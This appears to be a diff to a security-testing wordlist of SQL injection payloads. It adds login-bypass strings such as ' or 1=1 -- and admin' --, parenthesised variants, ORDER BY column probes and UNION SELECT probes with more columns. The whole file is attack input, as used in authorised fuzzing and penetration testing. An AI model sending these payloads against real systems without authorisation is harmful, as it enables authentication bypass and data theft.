@@ -1,10 +1,15 @@
 '
 ''
 ' --
+') --
 ' or 0 --
 ' or 1 --
+' or 1) --
 ' or 1=1 --
 ' or '1'='1
+' or '1'='1' --
+' or 1=1) --
+' or '1'='1') --
 admin' --
 admin@mail.com' --
 administrator' --
@@ -12,5 +17,7 @@ administrator' --
 ' order by 2 --
 ' order by 10 --
 ' union select 1,2 --
-' union select 111,222 --
-' union select '111','222' --
+' union select 1,2,3,4,5,6,7,8,9,10 --
+' union select 111,222,333,444 --
+' union select '111','222','333' --
+' union select 'A','B','C' --
